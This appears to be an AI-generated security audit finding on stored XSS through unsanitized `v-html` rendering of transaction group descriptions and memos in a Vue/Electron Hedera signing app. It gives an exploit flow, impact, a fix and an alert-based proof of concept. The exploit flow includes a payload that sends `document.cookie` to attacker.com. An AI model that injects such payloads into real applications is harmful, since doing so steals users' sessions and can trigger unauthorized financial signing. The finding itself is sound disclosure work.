Let me explore the target repository to understand its structure and look for potential injection vulnerabilities.

### Title
Stored XSS via Unsanitized `groupItem.description` and `transactionMemo` Rendered with `v-html` in Organization Mode

### Summary
In Organization Mode, the `CreateTransactionGroup.vue` component renders `groupItem.description` and `Transaction.fromBytes(...).transactionMemo` directly via Vue's `v-html` directive without any sanitization. A malicious organization member can craft a transaction group item with a description or transaction memo containing arbitrary HTML/JavaScript. When any other organization member opens that transaction group, the payload executes in their Electron renderer context, constituting stored cross-site scripting (stored XSS).

### Finding Description

**Root cause:** `v-html` in Vue bypasses Vue's template escaping and sets raw HTML on the DOM element. The binding at lines 421–429 of `CreateTransactionGroup.vue` passes three unsanitized, user-controlled strings directly to `v-html`:

```vue
v-html="
  groupItem.type == 'Transfer Transaction'
    ? makeTransfer(index)
    : groupItem.description != ''
      ? groupItem.description
      : Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        ? Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
        : createTransactionId(groupItem.payerAccountId, groupItem.validStart)
"
``` [1](#0-0) 

- `groupItem.description` is a free-text field set by the user when creating a transaction group item. In Organization Mode it is persisted on the NestJS backend and fetched by all members of the organization.
- `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` is the Hedera transaction memo field, which is also set by the creator and embedded in the serialized transaction bytes stored on the backend.

Neither value is passed through `escapeHtml` (which exists in the codebase at `back-end/libs/common/src/templates/layout.ts`) or any other sanitizer before being handed to `v-html`. [2](#0-1) 

**Exploit flow:**
1. Attacker (a valid organization member) creates a transaction group item and sets `description` to `<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">` (or any JavaScript payload).
2. The transaction group is saved to the NestJS API and stored in PostgreSQL.
3. Any other organization member opens the "Create Transaction Group" page for that group.
4. The Vue component fetches the group items and renders `groupItem.description` via `v-html`, executing the attacker's JavaScript in the victim's Electron renderer process.

### Impact Explanation

This is stored XSS in an Electron desktop application used to sign and submit Hedera financial transactions. Even with `contextIsolation: true`, the renderer process can:
- Call any IPC handler exposed via `contextBridge` (e.g., key management, transaction signing).
- Make authenticated HTTP/WebSocket requests to the NestJS backend using the victim's active session.
- Exfiltrate private data accessible in the renderer (localStorage, session state, displayed key material).

In the worst case, if the Electron `preload` script exposes signing or key-access IPC channels, the attacker can trigger unauthorized transaction signing or key export on behalf of the victim — directly impacting financial assets on the Hedera network.

### Likelihood Explanation

- **Attacker precondition:** Valid organization membership only. No admin or privileged role required.
- **Trigger:** The victim simply opens a transaction group that the attacker created or modified. This is a routine, expected workflow in Organization Mode.
- **Persistence:** The payload is stored server-side and fires for every organization member who views the group, not just once.
- **No user interaction beyond normal use:** Opening a shared transaction group is a core feature of the tool.

### Recommendation

Replace the raw `v-html` binding with safe text interpolation (`{{ }}`) for all user-supplied fields. If HTML rendering is genuinely required (e.g., for the `makeTransfer` formatted output), sanitize the value with a library such as `DOMPurify` before passing it to `v-html`:

```vue
<!-- Safe: plain text, no HTML injection possible -->
<div>{{ groupItem.description }}</div>

<!-- If HTML is needed, sanitize first -->
<div v-html="DOMPurify.sanitize(groupItem.description)"></div>
```

Apply the same fix to `transactionMemo`. The `escapeHtml` utility already present in the backend templates [2](#0-1) 
should be ported to the frontend renderer utilities and applied before any `v-html` usage.

### Proof of Concept

**Steps:**
1. Log in as a valid organization member (User A).
2. Navigate to "Create Transaction Group" and add any transaction.
3. Set the transaction group item description to:
   ```
   <img src=x onerror="alert('XSS: '+document.title)">
   ```
4. Save the group to the backend.
5. Log in as a different organization member (User B) and open the same transaction group.
6. The `onerror` handler fires in User B's Electron renderer, demonstrating stored XSS execution.

**Expected result:** JavaScript executes in User B's renderer context without any interaction beyond opening the shared group page. [1](#0-0)

### Citations

**File:** front-end/src/renderer/pages/CreateTransactionGroup/CreateTransactionGroup.vue (L419-430)
```vue
                class="align-self-center text-truncate col text-center mx-5"
                :data-testid="'span-transaction-timestamp-' + index"
                v-html="
                  groupItem.type == 'Transfer Transaction'
                    ? makeTransfer(index)
                    : groupItem.description != ''
                      ? groupItem.description
                      : Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
                        ? Transaction.fromBytes(groupItem.transactionBytes).transactionMemo
                        : createTransactionId(groupItem.payerAccountId, groupItem.validStart)
                "
              ></div>
```

**File:** back-end/libs/common/src/templates/layout.ts (L130-143)
```typescript
export function escapeHtml(str: string | null | undefined): string {
  if (str == null) {
    return "";
  }

  const value = String(str);

  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```
